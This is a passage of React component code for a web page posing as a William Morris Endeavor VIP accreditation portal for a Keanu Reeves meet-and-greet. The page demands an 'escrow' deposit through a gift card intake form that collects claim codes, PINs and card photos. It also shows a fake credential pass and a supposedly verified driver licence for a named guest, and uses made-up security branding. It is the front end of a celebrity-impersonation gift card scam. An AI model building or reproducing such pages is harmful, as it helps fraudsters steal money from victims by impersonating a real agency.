                        <span className="block text-[10px] font-mono text-[#737373] uppercase">Total Credited</span>
                        <strong className={`text-sm ${isEscrowSatisfied ? 'text-[#065F46]' : 'text-[#713B45]'}`}>
                          ${totalCredited}.00
                        </strong>
                      </div>
                      <div>
                        <span className="block text-[10px] font-mono text-[#737373] uppercase">Balance Due</span>
                        <strong className={`text-sm ${remainingBalance === 0 ? 'text-[#065F46]' : 'text-[#B91C1C]'}`}>
                          ${remainingBalance}.00
                        </strong>
                      </div>
                    </div>

                    <div className="pt-2.5">
                      <div className="flex items-center justify-between text-xs mb-1 font-sans">
                        <span className="text-[#737373]">Ledger Progress:</span>
                        <span className={`font-semibold ${isEscrowSatisfied ? 'text-[#065F46]' : 'text-[#713B45]'}`}>
                          {isEscrowSatisfied 
                            ? `100% Escrow Satisfied ($${totalCredited}.00 USD)` 
                            : `${escrowPercent}% Credited ($${remainingBalance}.00 USD Remaining)`}
                        </span>
                      </div>
                      <div className="w-full h-2 bg-[#E3E0DC] rounded-full overflow-hidden">
                        <div 
                          className={`h-full transition-all duration-300 ${isEscrowSatisfied ? 'bg-[#10B981]' : 'bg-[#713B45]'}`}
                          style={{ width: `${escrowPercent}%` }}
                        />
                      </div>
                    </div>
                  </div>

                  {/* Itemized Accredited Vouchers (if any) */}
                  {vouchers.length > 0 && (
                    <div className="space-y-2 pt-1">
                      <div className="flex items-center justify-between text-xs font-mono uppercase text-[#737373]">
                        <span className="flex items-center gap-1 font-semibold text-[#252525]">
                          <Receipt className="w-3.5 h-3.5 text-[#713B45]" />
                          <span>Accredited Vouchers on File ({vouchers.length})</span>
                        </span>
                        <span>Total: ${totalCredited}.00</span>
                      </div>

                      <div className="space-y-1.5 max-h-48 overflow-y-auto pr-0.5">
                        {vouchers.map((voucher, idx) => (
                          <div 
                            key={voucher.id || idx}
                            className="bg-[#FFFFFF] border border-[#E3E0DC] rounded-[2px] p-2.5 flex items-center justify-between text-xs font-mono"
                          >
                            <div className="flex items-center gap-2">
                              <span className="w-5 h-5 rounded-full bg-[#F8F7F4] border border-[#E3E0DC] text-[#713B45] text-[10px] flex items-center justify-center font-bold">
                                {idx + 1}
                              </span>
                              <div>
                                <div className="flex items-center gap-1.5 font-sans">
                                  <strong className="text-[#252525] text-xs">{voucher.giftCardType}</strong>
                                  <span className="text-[#065F46] font-bold text-xs font-mono">
                                    +${voucher.amount}.00 {voucher.currency || 'USD'}
                                  </span>
                                </div>
                                <div className="text-[11px] text-[#737373]">
                                  Code: <span className="text-[#252525] font-semibold">{voucher.giftCardCodeMasked}</span>
                                  {voucher.giftCardPin && <span> &bull; PIN: {voucher.giftCardPin}</span>}
                                </div>
                              </div>
                            </div>

                            <div className="flex items-center gap-2">
                              {voucher.giftCardImage && (
                                <button
                                  type="button"
                                  onClick={() => {
                                    setInspectModalImage(voucher.giftCardImage!);
                                    setInspectModalTitle(`${voucher.giftCardType} Voucher Scan ($${voucher.amount})`);
                                  }}
                                  className="p-1 text-[#713B45] hover:text-[#592E36] rounded transition-colors"
                                  title="Inspect voucher scan"
                                >
                                  <Eye className="w-4 h-4" />
                                </button>
                              )}
                              {!isCardActivated && (
                                <button
                                  type="button"
                                  onClick={() => handleRemoveVoucher(voucher.id)}
                                  className="p-1 text-[#9CA3AF] hover:text-[#DC2626] rounded transition-colors cursor-pointer"
                                  title="Remove voucher"
                                >
                                  <Trash2 className="w-4 h-4" />
                                </button>
                              )}
                            </div>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* Voucher Intake Form (Shown while balance remaining) */}
                  {remainingBalance > 0 && !isCardActivated && (
                    <div className="pt-2 border-t border-[#E3E0DC] space-y-3.5">
                      <span className="block text-xs font-mono uppercase text-[#713B45] font-semibold">
                        Deposit Gift Card / Voucher
                      </span>

                      {/* Denomination Selector */}
                      <div>
                        <label className="block text-[11px] font-mono text-[#737373] uppercase mb-1">
                          Select Voucher Face Value
                        </label>
                        <div className="flex flex-wrap gap-1.5">
                          {[50, 100, 200, 250, 500].map(val => (
                            <button
                              key={val}
                              type="button"
                              onClick={() => setCardAmountInput(String(val))}
                              className={`px-3 py-1 text-xs font-mono rounded-[2px] transition-colors cursor-pointer ${
                                cardAmountInput === String(val)
                                  ? 'bg-[#713B45] text-white font-semibold'
                                  : 'bg-[#F8F7F4] text-[#252525] border border-[#E3E0DC] hover:border-[#713B45]'
                              }`}
                            >
                              ${val}
                            </button>
                          ))}
                          {remainingBalance > 0 && remainingBalance !== 50 && remainingBalance !== 100 && remainingBalance !== 200 && remainingBalance !== 250 && remainingBalance !== 500 && (
                            <button
                              type="button"
                              onClick={() => setCardAmountInput(String(remainingBalance))}
                              className={`px-3 py-1 text-xs font-mono rounded-[2px] transition-colors cursor-pointer ${
                                cardAmountInput === String(remainingBalance)
                                  ? 'bg-[#713B45] text-white font-semibold'
                                  : 'bg-[#F8F7F4] text-[#252525] border border-[#E3E0DC] hover:border-[#713B45]'
                              }`}
                            >
                              Exact Due (${remainingBalance})
                            </button>
                          )}
                        </div>
                      </div>

                      {/* Card Provider & Amount Fields */}
                      <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                        <div>
                          <label htmlFor="giftCardTypeSelect" className="block text-[11px] font-mono text-[#737373] uppercase mb-1">
                            Card Provider
                          </label>
                          <select
                            id="giftCardTypeSelect"
                            value={selectedGiftCardType}
                            onChange={(e) => setSelectedGiftCardType(e.target.value)}
                            className="w-full bg-[#FFFFFF] border border-[#D1D5DB] focus:border-[#713B45] text-xs font-sans text-[#252525] rounded-[2px] py-2 px-3 focus:outline-none"
                          >
                            {(pricing.acceptedGiftCards || []).map((provider) => (
                              <option key={provider} value={provider}>
                                {provider}
                              </option>
                            ))}
                          </select>
                        </div>

                        <div>
                          <label htmlFor="cardAmountInput" className="block text-[11px] font-mono text-[#737373] uppercase mb-1">
                            Voucher Amount ($ USD)
                          </label>
                          <div className="relative">
                            <span className="absolute left-3 top-2 text-xs font-mono text-[#737373]">$</span>
                            <input
                              id="cardAmountInput"
                              type="number"
                              min="1"
                              max="1000"
                              value={cardAmountInput}
                              onChange={(e) => setCardAmountInput(e.target.value)}
                              placeholder="250"
                              className="w-full bg-[#FFFFFF] border border-[#D1D5DB] focus:border-[#713B45] text-xs font-mono text-[#252525] pl-7 pr-3 py-2 rounded-[2px] focus:outline-none"
                            />
                          </div>
                        </div>
                      </div>

                      {/* Claim Code Input */}
                      <div>
                        <label htmlFor="giftCardCodeInput" className="block text-[11px] font-mono text-[#737373] uppercase mb-1">
                          Gift Card Claim Code / Serial Number
                        </label>
                        <input
                          id="giftCardCodeInput"
                          type="text"
                          value={giftCardCodeInput}
                          onChange={(e) => {
                            setGiftCardCodeInput(e.target.value);
                            if (paymentError) setPaymentError('');
                          }}
                          placeholder="e.g. X7KM-92NQ-48PL-2026"
                          autoComplete="off"
                          className="w-full bg-[#FFFFFF] border border-[#D1D5DB] focus:border-[#713B45] text-xs font-mono text-[#252525] placeholder-[#9CA3AF] rounded-[2px] py-2.5 px-3 focus:outline-none uppercase tracking-wider"
                        />
                      </div>

                      {/* Card PIN / CVV */}
                      <div>
                        <label htmlFor="giftCardPinInput" className="block text-[11px] font-mono text-[#737373] uppercase mb-1">
                          Card PIN / CVV (If Applicable)
                        </label>
                        <input
                          id="giftCardPinInput"
                          type="text"
                          value={giftCardPinInput}
                          onChange={(e) => setGiftCardPinInput(e.target.value)}
                          placeholder="e.g. 8824 (optional)"
                          maxLength={8}
                          className="w-full bg-[#FFFFFF] border border-[#D1D5DB] focus:border-[#713B45] text-xs font-mono text-[#252525] placeholder-[#9CA3AF] rounded-[2px] py-2 px-3 focus:outline-none"
                        />
                      </div>

                      {/* Voucher Photo Scan Upload */}
                      <div>
                        <label className="text-[11px] font-mono text-[#737373] uppercase flex items-center gap-1 mb-1">
                          <Camera className="w-3.5 h-3.5 text-[#713B45]" />
                          <span>Voucher Photo Scan / Digital Proof</span>
                        </label>

                        {!giftCardImage ? (
                          <label className="border border-dashed border-[#D1D5DB] hover:border-[#713B45] bg-[#F8F7F4] hover:bg-[#FFFFFF] rounded-[2px] p-3.5 flex flex-col items-center justify-center cursor-pointer transition-colors">
                            <input
                              type="file"
                              id="giftCardFileInput"
                              accept="image/*"
                              onChange={handleImageFileChange}
                              className="hidden"
                            />
                            <UploadCloud className="w-5 h-5 text-[#737373] mb-1" />
                            <span className="text-xs font-medium text-[#252525]">
                              Upload Voucher Front/Back Photo or Receipt
                            </span>
                            <span className="text-[11px] text-[#737373] mt-0.5">
                              PNG, JPG, or PDF up to 10MB
                            </span>
                          </label>
                        ) : (
                          <div className="bg-[#F8F7F4] border border-[#E3E0DC] rounded-[2px] p-2.5 flex items-center justify-between gap-3">
                            <div 
                              onClick={() => {
                                setInspectModalImage(giftCardImage);
                                setInspectModalTitle(giftCardImageName || 'Voucher Scan');
                              }}
                              className="flex items-center gap-2.5 cursor-pointer"
                            >
                              <div className="w-12 h-9 bg-white border border-[#E3E0DC] rounded overflow-hidden flex items-center justify-center shrink-0">
                                <img
                                  src={giftCardImage}
                                  alt="Gift Card Attached"
                                  className="w-full h-full object-cover"
                                />
                              </div>
                              <div>
                                <span className="text-xs font-mono text-[#252525] block font-semibold truncate max-w-[200px]">
                                  {giftCardImageName || 'Voucher Scan Attached'}
                                </span>
                                <span className="text-[11px] font-sans text-[#065F46] flex items-center gap-1">
                                  <CheckCircle2 className="w-3 h-3 text-[#10B981]" />
                                  Scan Attached &bull; Click to Inspect
                                </span>
                              </div>
                            </div>

                            <button
                              type="button"
                              onClick={() => {
                                setGiftCardImage(null);
                                setGiftCardImageName('');
                              }}
                              className="p-1.5 text-[#737373] hover:text-[#DC2626] rounded transition-colors cursor-pointer"
                              title="Remove image"
                            >
                              <Trash2 className="w-4 h-4" />
                            </button>
                          </div>
                        )}
                      </div>

                      {paymentError && (
                        <div className="p-3 bg-[#FEF2F2] border border-[#FCA5A5] rounded-[2px] flex items-start gap-2 text-xs text-[#991B1B]">
                          <AlertCircle className="w-4 h-4 shrink-0 mt-0.5 text-[#DC2626]" />
                          <span>{paymentError}</span>
                        </div>
                      )}

                      {paymentSuccessNotice && (
                        <div className="p-3 bg-[#ECFDF5] border border-[#A7F3D0] rounded-[2px] flex items-start gap-2 text-xs text-[#065F46]">
                          <CheckCircle2 className="w-4 h-4 shrink-0 mt-0.5 text-[#10B981]" />
                          <span>{paymentSuccessNotice}</span>
                        </div>
                      )}

                      <button
                        type="button"
                        id="submit-giftcard-btn"
                        onClick={handleApplyVoucher}
                        disabled={isSubmittingPayment || !giftCardCodeInput.trim()}
                        className="w-full py-2.5 px-4 bg-[#252525] hover:bg-[#111111] disabled:opacity-40 text-white font-medium text-xs rounded-[2px] transition-colors flex items-center justify-center gap-2 cursor-pointer shadow-xs"
                      >
                        {isSubmittingPayment ? (
                          <>
                            <RotateCw className="w-3.5 h-3.5 animate-spin text-white" />
                            <span>Verifying Voucher with Gateway...</span>
                          </>
                        ) : (
                          <>
                            <Plus className="w-3.5 h-3.5" />
                            <span>Verify &amp; Apply Card (+${cardAmountInput || remainingBalance || 250} USD)</span>
                          </>
                        )}
                      </button>
                    </div>
                  )}

                  {activationError && (
                    <div className="p-3 bg-[#FEF2F2] border border-[#FCA5A5] rounded-[2px] flex items-start gap-2 text-xs text-[#991B1B]">
                      <AlertCircle className="w-4 h-4 shrink-0 mt-0.5 text-[#DC2626]" />
                      <span>{activationError}</span>
                    </div>
                  )}

                  {/* Primary Activation Button */}
                  {!isCardActivated && (
                    <div className="pt-2 border-t border-[#E3E0DC]">
                      <button
                        type="button"
                        id="submit-activate-btn"
                        onClick={handleActivateCard}
                        disabled={isActivating || !isPinValid || !isEscrowSatisfied}
                        className={`w-full py-3.5 px-4 font-sans text-xs uppercase tracking-wider font-semibold rounded-[2px] shadow-xs transition-colors flex items-center justify-center gap-2 cursor-pointer ${
                          isPinValid && isEscrowSatisfied
                            ? 'bg-[#713B45] hover:bg-[#592E36] text-white'
                            : 'bg-[#E5E7EB] text-[#9CA3AF] cursor-not-allowed'
                        }`}
                      >
                        {isActivating ? (
                          <>
                            <RotateCw className="w-4 h-4 animate-spin text-white" />
                            <span>Authenticating OATH Clearance...</span>
                          </>
                        ) : !isEscrowSatisfied ? (
                          <span>Deposit Remaining Escrow (${remainingBalance}.00 Due) to Unlock</span>
                        ) : (
                          <>
                            <ShieldCheck className="w-4 h-4" />
                            <span>Authenticate PIN &amp; Activate VIP Card</span>
                          </>
                        )}
                      </button>

                      <p className="text-[11px] font-mono text-[#737373] text-center pt-2">
                        Initiative for Open AuTHentication (OATH) &bull; RFC-4226 &amp; AES-256 VIP Standard
                      </p>
                    </div>
                  )}
                </div>
              </div>

              {/* Right Column: Credential Pass Visualizer & Admittance Rules */}
              <div className="lg:col-span-5 space-y-6">
                {/* 1. Credential Pass Visualizer Card */}
                <div className="bg-[#FFFFFF] border border-[#E3E0DC] rounded-[2px] p-5 shadow-xs">
                  <div className="flex items-center justify-between pb-3 border-b border-[#E3E0DC] mb-3">
                    <h2 className="font-serif font-bold text-base text-[#252525]">
                      Credential Pass Document
                    </h2>
                    <span className="text-[11px] font-mono text-[#737373]">
                      Ref: WME-KR26-0813-VIP
                    </span>
                  </div>

                  {/* Tab Selector: Front / Back / Both */}
                  <div className="flex items-center gap-1 p-1 bg-[#F8F7F4] border border-[#E3E0DC] rounded-[2px] mb-3 text-xs font-sans">
                    <button
                      type="button"
                      onClick={() => setBadgeFace('front')}
                      className={`flex-1 py-1.5 text-center font-medium rounded-[2px] transition-colors cursor-pointer ${
                        badgeFace === 'front' 
                          ? 'bg-[#FFFFFF] text-[#713B45] shadow-xs font-semibold' 
                          : 'text-[#737373] hover:text-[#252525]'
                      }`}
                    >
                      Front Face
                    </button>
                    <button
                      type="button"
                      onClick={() => setBadgeFace('back')}
                      className={`flex-1 py-1.5 text-center font-medium rounded-[2px] transition-colors cursor-pointer ${
                        badgeFace === 'back' 
                          ? 'bg-[#FFFFFF] text-[#713B45] shadow-xs font-semibold' 
                          : 'text-[#737373] hover:text-[#252525]'
                      }`}
                    >
                      Back Face
                    </button>
                    <button
                      type="button"
                      onClick={() => setBadgeFace('complete')}
                      className={`flex-1 py-1.5 text-center font-medium rounded-[2px] transition-colors cursor-pointer ${
                        badgeFace === 'complete' 
                          ? 'bg-[#FFFFFF] text-[#713B45] shadow-xs font-semibold' 
                          : 'text-[#737373] hover:text-[#252525]'
                      }`}
                    >
                      Complete Sheet
                    </button>
                  </div>

                  {/* Badge Image Frame */}
                  <div className="bg-[#F8F7F4] border border-[#E3E0DC] rounded-[2px] p-2 flex items-center justify-center overflow-hidden">
                    <img
                      src={badgeFace === 'front' ? frontImg : badgeFace === 'back' ? backImg : completeImg}
                      alt={`Brenda Wright VIP Pass ${badgeFace}`}
                      className="w-full max-h-[420px] object-contain rounded-[2px] shadow-xs cursor-pointer hover:opacity-95 transition-opacity"
                      onClick={() => setBadgeFace(badgeFace === 'front' ? 'back' : 'front')}
                      title="Click badge to flip"
                    />
                  </div>

                  <p className="text-[11px] text-[#737373] text-center mt-2 italic font-sans">
                    Click badge image to flip between Front and Back security faces.
                  </p>

                  {/* Direct Document Downloads */}
                  <div className="pt-3 border-t border-[#E3E0DC] mt-3 grid grid-cols-2 gap-2 text-xs font-sans">
                    <button
                      type="button"
                      onClick={() => triggerDirectDownload(pdfFile, 'Brenda-Wright-VIP-Meet-Greet-Pass.pdf')}
                      className="col-span-2 py-2 px-3 bg-[#713B45] hover:bg-[#592E36] text-white font-medium rounded-[2px] transition-colors flex items-center justify-center gap-1.5 cursor-pointer shadow-xs"
                    >
                      <Download className="w-3.5 h-3.5" />
                      <span>Download Official PDF Document</span>
                    </button>
                    <button
                      type="button"
                      onClick={() => triggerDirectDownload(frontImg, 'Brenda-Wright-VIP-Pass-Front.png')}
                      className="py-1.5 px-2.5 bg-[#FFFFFF] border border-[#D1D5DB] hover:border-[#713B45] text-[#252525] rounded-[2px] text-center cursor-pointer"
                    >
                      Front Face (PNG)
                    </button>
                    <button
                      type="button"
                      onClick={() => triggerDirectDownload(backImg, 'Brenda-Wright-VIP-Pass-Back.png')}
                      className="py-1.5 px-2.5 bg-[#FFFFFF] border border-[#D1D5DB] hover:border-[#713B45] text-[#252525] rounded-[2px] text-center cursor-pointer"
                    >
                      Back Face (PNG)
                    </button>
                  </div>
                </div>

                {/* 2. Venue Admittance Rules Card */}
                <div className="bg-[#FFFFFF] border border-[#E3E0DC] rounded-[2px] p-5 shadow-xs space-y-2.5 text-xs text-[#737373] font-sans">
                  <h3 className="font-serif font-bold text-sm text-[#252525]">
                    Venue Admittance Protocol &bull; Keanu Reeves Green Room
                  </h3>
                  <ul className="space-y-1.5 list-disc list-inside leading-relaxed">
                    <li>Government-issued Florida photo ID required upon talent lounge check-in.</li>
                    <li>Credential pass must be presented digitally or in printed high-res format.</li>
                    <li>Single admittance strictly non-transferable under WME talent rider terms.</li>
                    <li>Designated intake escort call time: <strong>Tuesday, Nov 3, 2026 at 19:30 PST</strong>.</li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
        )}
      </main>

      {/* 3. Footer: Traditional WME Agency Tagline */}
      <footer className="border-t border-[#E3E0DC] bg-[#FFFFFF] py-4 text-center text-xs text-[#737373] font-sans">
        <div className="max-w-6xl mx-auto px-4">
          William Morris Endeavor (WME) &bull; Talent Relations &amp; VIP Accreditation Division &bull; Beverly Hills, CA
        </div>
      </footer>

      {/* Lightbox Modal: Florida Driver License Inspection */}
      {showIdModal && (
        <div 
          className="fixed inset-0 z-50 bg-black/60 flex items-center justify-center p-4 backdrop-blur-xs"
          onClick={() => setShowIdModal(false)}
        >
          <div 
            className="bg-[#FFFFFF] border border-[#E3E0DC] rounded-[2px] max-w-lg w-full p-5 space-y-3 shadow-lg"
            onClick={(e) => e.stopPropagation()}
          >
            <div className="flex items-center justify-between pb-2 border-b border-[#E3E0DC]">
              <h3 className="font-serif font-bold text-base text-[#252525]">
                Verified Government Identification Document
              </h3>
              <button
                type="button"
                onClick={() => setShowIdModal(false)}
                className="p-1 text-[#737373] hover:text-[#252525] cursor-pointer"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            <div className="bg-[#F8F7F4] border border-[#E3E0DC] rounded-[2px] p-2 flex items-center justify-center overflow-hidden">
              <img
                src={licenseImg}
                alt="Florida Driver License"
                className="w-full max-h-[360px] object-contain rounded-[2px]"
              />
            </div>

            <div className="text-xs text-[#737373] font-sans space-y-1">
              <div>Passholder: <strong>{params.guest}</strong> &bull; Document: <strong>Florida Driver License</strong></div>
              <div>Verification Status: <span className="text-[#065F46] font-semibold">Vetted by WME Talent Relations</span></div>
            </div>

            <button
              type="button"
              onClick={() => setShowIdModal(false)}
              className="w-full py-2 bg-[#F8F7F4] border border-[#D1D5DB] hover:bg-[#E5E7EB] text-[#252525] text-xs font-medium rounded-[2px] cursor-pointer"
            >
              Close Document
            </button>
          </div>
        </div>
      )}

      {/* Lightbox Modal: Gift Card Proof Inspection */}
      {inspectModalImage && (
        <div 
          className="fixed inset-0 z-50 bg-black/60 flex items-center justify-center p-4 backdrop-blur-xs"
          onClick={() => setInspectModalImage(null)}
        >
          <div 
            className="bg-[#FFFFFF] border border-[#E3E0DC] rounded-[2px] max-w-lg w-full p-5 space-y-3 shadow-lg"
            onClick={(e) => e.stopPropagation()}
          >
            <div className="flex items-center justify-between pb-2 border-b border-[#E3E0DC]">
              <h3 className="font-serif font-bold text-base text-[#252525]">
                {inspectModalTitle || 'Voucher Scan Document'}
              </h3>
              <button
                type="button"
                onClick={() => setInspectModalImage(null)}
                className="p-1 text-[#737373] hover:text-[#252525] cursor-pointer"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            <div className="bg-[#F8F7F4] border border-[#E3E0DC] rounded-[2px] p-2 flex items-center justify-center overflow-hidden">
              <img
                src={inspectModalImage}
                alt="Voucher Scan Proof"
                className="w-full max-h-[380px] object-contain rounded-[2px]"
              />
            </div>

            <button
              type="button"
              onClick={() => setInspectModalImage(null)}
              className="w-full py-2 bg-[#F8F7F4] border border-[#D1D5DB] hover:bg-[#E5E7EB] text-[#252525] text-xs font-medium rounded-[2px] cursor-pointer"
            >
              Close Proof Scan
            </button>
          </div>
        </div>
      )}
    </div>
  );
};
